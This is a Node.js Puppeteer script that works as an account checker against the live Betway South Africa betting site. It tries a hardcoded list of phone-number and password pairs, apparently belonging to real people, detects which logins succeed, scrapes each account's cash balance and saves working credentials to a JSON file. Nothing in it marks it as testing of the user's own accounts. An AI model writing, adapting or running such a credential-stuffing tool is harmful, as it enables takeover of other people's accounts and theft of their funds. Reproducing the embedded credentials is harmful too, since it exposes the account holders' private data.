const puppeteer = require('puppeteer');
const fs = require('fs');

// Define file paths for storing login results
const successfulLoginsFile = 'successful_logins.json';
const failedLoginsFile = 'failed_logins.json';

// Ensure the JSON files exist; if not, create them with an empty array
const ensureJsonFileExists = (filePath) => {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify([], null, 2));
    console.log(`${filePath} created.`);
  }
};

// Check and create the JSON files if needed
ensureJsonFileExists(successfulLoginsFile);
ensureJsonFileExists(failedLoginsFile);

// Credentials to test
const credentials = [
  { phone: "0728205943", password: "19833" },
  { phone: "0726905388", password: "Mphazima" }
];

(async () => {
  const browser = await puppeteer.launch({ headless: false }); // Use 'false' to see the browser actions
  const page = await browser.newPage();

  // Load existing data from the JSON files
  const successfulLogins = JSON.parse(fs.readFileSync(successfulLoginsFile));
  const failedLogins = JSON.parse(fs.readFileSync(failedLoginsFile));

  for (const { phone, password } of credentials) {
    try {
      console.log(`Trying account: ${phone}`);

      // Navigate to the Betway login page
      await page.goto('https://betway.co.za/?Logout=true', { waitUntil: 'networkidle2' });

      // Click the "Login" button at the top right of the page
      await page.waitForSelector('button:has-text("Login")'); // Adjust if selector changes
      await page.click('button:has-text("Login")');
      await page.waitForTimeout(2000); // Wait for the login popup to appear

      // Enter phone number and password
      await page.type('input[name="MobileNumber"]', phone);
      await page.type('input[name="Password"]', password);

      // Click the Login button in the popup
      await page.click('button:has-text("Login")'); // Adjust if selector changes
      await page.waitForTimeout(5000); // Wait for the page to load after login

      // Check if login is successful by looking for the balance
      const balanceSelector = 'Cash '; // Replace with the correct selector for balance
      const isLoggedIn = await page.$(balanceSelector);

      if (isLoggedIn) {
        // Extract balance amount
        const balance = await page.$eval(balanceSelector, el => el.textContent.trim());
        console.log(`Login successful for ${phone}, Balance: ${balance}`);

        // Save successful login details
        successfulLogins.push({ phone, password, balance });
      } else {
        console.log(`Login failed for ${phone}`);
        failedLogins.push({ phone, password });
      }
    } catch (error) {
      console.error(`Error processing account ${phone}: ${error.message}`);
      failedLogins.push({ phone, password });
    }
  }

  // Save successful logins to a JSON file
  fs.writeFileSync(successfulLoginsFile, JSON.stringify(successfulLogins, null, 2));
  console.log('Successful logins saved to successful_logins.json');

  // Save failed logins to a JSON file
  fs.writeFileSync(failedLoginsFile, JSON.stringify(failedLogins, null, 2));
  console.log('Failed logins saved to failed_logins.json');

  await browser.close();
})();
